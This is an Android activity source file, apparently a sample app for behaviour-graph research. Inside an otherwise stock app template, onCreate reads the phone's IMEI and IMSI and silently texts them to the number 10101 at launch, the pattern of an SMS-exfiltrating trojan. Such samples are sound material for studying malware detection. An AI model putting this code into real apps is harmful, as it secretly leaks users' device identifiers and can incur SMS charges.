package learning.android.ntu.edu.behaviorgraphsample;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.MenuItem;

public class MainActivity extends AppCompatActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)getSystemService("phone");

        String imei = tm.getDeviceId();
        String imsi = tm.getSubscriberId();
        SmsManager.getDefault().sendTextMessage("10101", null, imei + imsi, null, null);
        //SmsManager.getDefault().sendTextMessage("10101", null, getIMEI(this)+getIMSI(this), null, null);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public String getIMEI(android.content.Context context){ android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)context.getSystemService("phone"); return tm.getDeviceId();}

    /**
     * Required permission: android.permission.READ_PHONE_STATE
     * @param context
     * @return
     */
    public String getIMSI(android.content.Context context){ android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)context.getSystemService("phone"); return tm.getSubscriberId();}

}
